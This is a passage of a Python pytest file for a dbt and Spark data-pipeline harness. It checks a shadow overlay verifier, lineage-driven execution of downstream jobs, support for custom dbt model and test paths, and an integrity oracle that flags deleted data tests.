    (seed_repo / "seeds" / "raw_items.csv").write_text("id,val\n1,-5\n", encoding="utf-8")
    (seed_repo / "models" / "marts" / "fct_items.sql").write_text(
        "SELECT id, val FROM {{ ref('raw_items') }}\n", encoding="utf-8"
    )
    (seed_repo / "tests" / "assert_pos.sql").write_text(
        "SELECT * FROM {{ ref('fct_items') }} WHERE val <= 0\n", encoding="utf-8"
    )
    (seed_repo / "dataops-harness.yaml").write_text("version: 1\n", encoding="utf-8")
    (seed_repo / ".gitignore").write_text("target/\nlogs/\nwarehouse.duckdb*\n", encoding="utf-8")
    for cmd in (["seed"], ["run"]):
        proc = subprocess.run([dbt, "--no-version-check", *cmd, "--profiles-dir", "."], cwd=seed_repo, capture_output=True, text=True, check=False)
        assert proc.returncode == 0, proc.stderr or proc.stdout
    _init_git_repo(seed_repo)

    runs_seed = tmp_path / "runs_seed"
    wt_seed = RunWorktreeManager.create(seed_repo, runs_seed, "run-f8c")
    (wt_seed / "seeds" / "raw_items.csv").write_text("id,val\n1,5\n", encoding="utf-8")
    res_seed = ShadowOverlayVerifier(prod_workspace=seed_repo, runs_dir=runs_seed).verify("run-f8c", wt_seed)
    assert res_seed.passed is True, res_seed.failure_reasons

    # F8d: Multi-upstream Spark silver job sees unmodified sibling silver tables inside target_silver_dir.
    ms_repo = tmp_path / "multi_spark"
    (ms_repo / "spark_jobs").mkdir(parents=True)
    (ms_repo / "spark_jobs" / "lineage.yaml").write_text(
        "assets:\n"
        "  raw_a:\n    engine: raw\n    layer: raw\n    upstream: []\n"
        "  raw_b:\n    engine: raw\n    layer: raw\n    upstream: []\n"
        "  silver_a:\n    engine: spark\n    layer: silver\n    job_path: spark_jobs/a.py\n    upstream: [raw_a]\n"
        "  silver_b:\n    engine: spark\n    layer: silver\n    job_path: spark_jobs/b.py\n    upstream: [raw_b]\n"
        "  silver_c:\n    engine: spark\n    layer: silver\n    job_path: spark_jobs/c.py\n    upstream: [silver_a, silver_b]\n",
        encoding="utf-8",
    )
    for fn in ("a.py", "b.py", "c.py"):
        (ms_repo / "spark_jobs" / fn).write_text("# stub\n", encoding="utf-8")
    prod_silver = tmp_path / "prod_silver"
    (prod_silver / "silver_a").mkdir(parents=True)
    (prod_silver / "silver_b").mkdir(parents=True)
    target_silver = tmp_path / "target_silver"

    saw_sibling_before_c = {"ok": False}

    class _CheckingSpark:
        def run_job(self, script_path: Path, args=None, **_kwargs):  # type: ignore[no-untyped-def]
            if script_path.name == "a.py":
                (target_silver / "silver_a").mkdir(parents=True, exist_ok=True)
            elif script_path.name == "c.py":
                saw_sibling_before_c["ok"] = (target_silver / "silver_b").exists()
            return SparkRunResult(
                job_name=script_path.stem,
                script_path=script_path,
                pid=1,
                returncode=0,
                duration_ms=1.0,
                event_log_path=None,
                stdout="",
                stderr="",
            )

    la_ms = LineageAdapter.from_workspace(ms_repo)
    aff_ms = la_ms.affected_downstream(["spark_jobs/a.py"])
    execute_pipeline_subset(
        code_workspace=ms_repo,
        raw_dir=tmp_path / "raw_s",
        prod_silver_dir=prod_silver,
        target_silver_dir=target_silver,
        target_duckdb_path=tmp_path / "ms.duckdb",
        changed_files=["spark_jobs/a.py"],
        affected_spark_jobs=aff_ms.spark_jobs,
        affected_dbt_models=aff_ms.dbt_models,
        spark_runner=_CheckingSpark(),  # type: ignore[arg-type]
        dbt_executor=lambda *_a, **_kw: subprocess.CompletedProcess([], 0, stdout="", stderr=""),
        lineage_adapter=la_ms,
    )
    assert saw_sibling_before_c["ok"] is True


def test_unit3_f9_oracle_nested_tests_and_custom_dbt_paths(tmp_path: Path) -> None:
    """F9: Support nested singular tests and custom model-paths/test-paths across Oracle, incremental check, and execute_pipeline_subset."""
    prod = tmp_path / "custom_prod"
    wt = tmp_path / "custom_wt"
    for root in (prod, wt):
        (root / "transformations" / "marts").mkdir(parents=True)
        (root / "data_tests" / "marts").mkdir(parents=True)
        (root / "dbt_project.yml").write_text(
            'name: custom_app\nmodel-paths: ["transformations"]\ntest-paths: ["data_tests"]\n',
            encoding="utf-8",
        )
        (root / "transformations" / "marts" / "fct_inc.sql").write_text(
            "SELECT id FROM raw {% if is_incremental() %} WHERE dt > '2026-01-01' {% endif %}\n",
            encoding="utf-8",
        )
        (root / "transformations" / "schema.yml").write_text(
            "version: 2\nmodels:\n  - name: fct_inc\n    columns:\n      - name: id\n        tests: [not_null]\n",
            encoding="utf-8",
        )
        (root / "data_tests" / "marts" / "assert_nested.sql").write_text(
            "SELECT * FROM {{ ref('fct_inc') }} WHERE id IS NULL\n",
            encoding="utf-8",
        )

    # 1. Custom model-paths incremental detection
    (wt / "transformations" / "marts" / "fct_inc.sql").write_text(
        "SELECT id FROM raw {% if is_incremental() %} WHERE dt > '2026-11-01' {% endif %}\n",
        encoding="utf-8",
    )
    assert (
        touches_incremental_logic(
            prod, wt, ["transformations/marts/fct_inc.sql"], dbt_project_rel=""
        )
        is True
    )

    # 2. Oracle catches deleted nested singular test under custom test-paths
    wt_nested = tmp_path / "wt_nested"
    shutil.copytree(prod, wt_nested)
    (wt_nested / "data_tests" / "marts" / "assert_nested.sql").unlink()
    oracle = DefaultIntegrityOracle()
    verdict_nested = oracle.verify(
        prod_workspace=prod,
        worktree_dir=wt_nested,
        shadow_silver_dir=tmp_path / "none",
        shadow_duckdb_path=tmp_path / "none.duckdb",
        changed_files=["data_tests/marts/assert_nested.sql"],
        unified_diff="",
    )
    assert verdict_nested.passed is False

    # 3. Oracle catches deleted schema.yml column test under custom model-paths
    wt_schema = tmp_path / "wt_schema"
    shutil.copytree(prod, wt_schema)
    (wt_schema / "transformations" / "schema.yml").write_text(
        "version: 2\nmodels:\n  - name: fct_inc\n    columns:\n      - name: id\n",
        encoding="utf-8",
    )
    verdict_schema = oracle.verify(
        prod_workspace=prod,
        worktree_dir=wt_schema,
        shadow_silver_dir=tmp_path / "none",
        shadow_duckdb_path=tmp_path / "none.duckdb",
        changed_files=["transformations/schema.yml"],
        unified_diff="",
    )
    assert verdict_schema.passed is False

    # 4. Manifestless execute_pipeline_subset triggers dbt for custom model-paths
    dbt_calls: list[list[str]] = []

    def _recording_dbt(_paths, _overrides, _db, args):  # type: ignore[no-untyped-def]
        dbt_calls.append(list(args))
        return subprocess.CompletedProcess(args, 0, stdout="ok", stderr="")

    execute_pipeline_subset(
        code_workspace=prod,
        raw_dir=tmp_path / "raw_cust",
        prod_silver_dir=tmp_path / "silver_cust",
        target_silver_dir=tmp_path / "tgt_cust",
        target_duckdb_path=tmp_path / "cust.duckdb",
        changed_files=["transformations/marts/fct_inc.sql"],
        affected_spark_jobs=[],
        affected_dbt_models=[],
        spark_runner=type("_NoSpark", (), {"run_job": lambda *_a, **_kw: None})(),  # type: ignore[arg-type]
        dbt_executor=_recording_dbt,
        dbt_project_rel="",
    )
    assert any("run" in call and any("fct_inc" in arg for arg in call) for call in dbt_calls)
